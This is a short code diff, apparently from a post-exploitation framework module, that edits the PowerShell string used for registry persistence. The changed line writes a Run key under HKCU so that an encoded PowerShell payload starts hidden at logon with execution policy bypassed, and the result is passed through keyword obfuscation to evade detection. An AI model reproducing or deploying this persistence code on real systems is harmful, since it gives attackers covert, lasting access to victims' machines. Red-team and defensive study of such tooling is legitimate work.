@@ -279,7 +279,7 @@ class Module(object):
         
         # set the run key to extract the encoded script from the specified location
         #   and start powershell.exe in the background with the encoded command
-        script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + keyName + " -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=" + locationString + ";powershell -Win Hidden -enc $x\"';"
+        script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + keyName + " -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=" + locationString + ";powershell -exec bypass -Noninteractive -windowstyle hidden -enc $x\"';"
         
         script += "'Registry persistence established " + statusMsg + "'"
         script = helpers.keyword_obfuscation(script)
